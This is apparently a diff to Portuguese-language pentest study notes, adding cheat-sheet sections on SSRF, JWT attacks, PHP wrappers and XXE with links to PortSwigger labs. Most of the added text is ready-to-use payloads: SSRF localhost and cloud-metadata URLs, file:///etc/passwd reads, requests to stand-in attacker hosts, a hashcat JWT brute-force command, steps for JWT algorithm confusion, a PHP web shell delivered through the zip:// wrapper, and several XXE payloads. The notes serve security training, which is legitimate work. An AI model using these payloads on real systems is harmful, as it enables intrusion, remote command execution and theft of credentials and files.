@@ -9426,13 +9426,144 @@ LABS
 [CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie)
 
 
-.
-.
-.
-.
-.
+SSRF - Server-Side Request Forgery
+Este tipo de ataque pode ser identificado fazendo testes e, `/file=` `/path=` `/src=` `imhURL` `ExportPDF` `Ler conteudos de outros sites`
+
+	[http://127.0.0.1:port ](http://127.0.0.1:port
+	http://localhost:port
+	http://[::]:port
+	http://0000::1:port
+	http://[0:0:0:0:0:ffff:127.0.0.1]
+	http://0/
+	http://127.1
+	http://127.0.1
+	/etc/passwd
+    file:///etc/passwd
+    file://path/to/file
+    file://\/\/etc/passwd
+	sftp://attacker.com:port/
+	dict://attacker:port/
+	tftp://attacker.com:port/
+	ldap://localhost:port/
+	gopher://127.0.0.1:port/
+	<?php $file = $_GET['file']; header("location:file://$file");?>
+	\<iframe src="http://attacker-ip/test.php?file=/etc/passwd"\>\</iframe\>
+	AWS
+	http://instance-data
+	http://169.254.169.254
+	http://169.254.169.254/latest/user-data
+	GCP
+	http://169.254.169.254/computeMetadata/v1/
+	http://metadata/computeMetadata/v1/
+	
+LABS
+
+[Basic SSRF against localhost](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)
+
+[Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)
 
 
+PHP TYPE JUGGLING
+Não foi explicado nem mostrado em LAB
+
+JWT
+Avaliar a assinatura se permite colocar como `none` se consegue quebrar o token e até mesmo realiza bruteforce. JWT sempre começa com `ey`
+
+	hashcat -a -0 -m 16500 TOKEN-JWT rockyou.txt
+	Completaro o token em jwt.io
+	No token caso haja Kid, podendo alterar para /dev/null e/ou realizar testes de SQLi
+		ALGORITHM CONFUSION
+	1 Obter a chave pública:
+    A. Certificado SSL
+    B. /jwks.json 
+    C. /.well-known/jwks.json
+	2 Converter o token com o JWT Editor
+	3 Modificar o algoritmo do token
+	4 Assinar usando a chave pública
+
+Passo a passo mais fetalhado para o ataque `Algorithm Confusion`: Copia a chave publica do .well-known, coloca no JWT EDITOR e CRIA uma `new RSA key` PEM,  COPIA A CHAVE RSA e TRANSFORMA em BASE64, volta no JTW EDITOR e vai em New Symmetric Key e no lugar no K coloca o Base64, volta no REPEATER e troca de RS256 para HS256 em SUB coloca administrator manda assinar o token com a chave gerada sem modificar o HEADER
+
+LABS
+[JWT authentication bypass via unverified signature](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature)
+
+[Brute-forcing secret keys](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key)
+
+[JWT authentication bypass via kid header path traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)
+
+[JWT authentication bypass via algorithm confusion](https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion)
+
+PHP WRAPPERS
+Usado como recurso do PHP mas pode ser utilizado para ataques
+file:// - Acessar o File System
+http:// - Acessar HTTP(s) URLs
+ftp:// - Acessar FTP(s) URLs
+php:// - Acessar various I/O streams
+zlib:// - Compression Streams
+data:// - Data (RFC 2397)
+glob:// - Find pathnames matching pattern
+phar:// - PHP Archive
+ssh2:// - Secure Shell 2
+rar:// - RAR
+ogg:// - Audio streams
+expect:// - Process Interaction Streams
+filter:// - Codificar um arquivo (Base64, ROT13)
+
+base64
+
+    php://filter/convert.base64-encode/resource=<path_arquivo>
+
+Rot13
+
+	php://filter/read=string.rot13/resource=<path_arquivo>
+
+Comandos de Preparação
+
+    $ echo '<?php echo shell_exec($_GET["cmd"]); ?>' > shell.php
+    $ zip malicious.zip shell.php
+
+Payload
+
+    zip://malicious.zip%23shell.php&cmd=ls
+
+Este não é instalado por padrão, mas se presente permite rodar comandos
+
+	expect://<comando>
+
+XXE PAYLOADS
+
+File Inclusion
+
+	<?xml version="1.0"?>
+	<!DOCTYPE foo [
+	<!ELEMENT foo (#ANY)>
+	<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+	<foo>&xxe;</foo>
+
+Bypass de Controle de Acesso
+
+
+	<?xml version="1.0"?>
+	<!DOCTYPE foo [
+	<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>
+	<foo>&ac;</foo>
+XXE com SSRF
+
+	<?xml version="1.0"?>
+	<!DOCTYPE foo [
+	<!ELEMENT foo (#ANY)>
+	<!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]>
+	<foo>&xxe;</foo>
+
+Bypass com UTF-7
+
+	<?xml version="1.0"?>
+	+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ACA-+ACA-+AAo-+ADw-
+	+ACE-ELEMENT+ACA-foo+ACA-(+ACM-ANY)+AD4-+AAo-+ADw-+ACE-
+	ENTITY+ACA-xxe+ACA-SYSTEM+ACA-+ACI-
+	https://www.example.com/text.txt+ACI-+AAo-+AD4-+AF0-
+	+AD4-+AAo-+ADw-foo+AD4-+ACY-xxe+ADs-+ADw-/foo+AD4-+AAo-
+
+Notas: Quando a exploração do XXE por exemplo ler o `/etc/` fazendo a listagem de diretórios, sabe-se que a linguagem da aplicação não é PHP, e sim um JAVA.
 
 ## PTA
 
@@ -9475,18 +9606,6 @@ Algumas formas de Pivoting
 	# Encaminha sua ferramenta para a rede interna
 	`ssh -R 9090:seu-ip:9090 usuario@maquina-alvo`
   
-TO BE CONTINUED
-.
-.
-.
-.
-.
-.
-.
-.
-.
-.
-.
 ## PENTEST PLUS
 
 `Hacker Ético` é o profissioal de cibersegurança que pode atuar desde u GRC, SOC, NOC, Atividade de RedTeam, criação de políticas, etc...
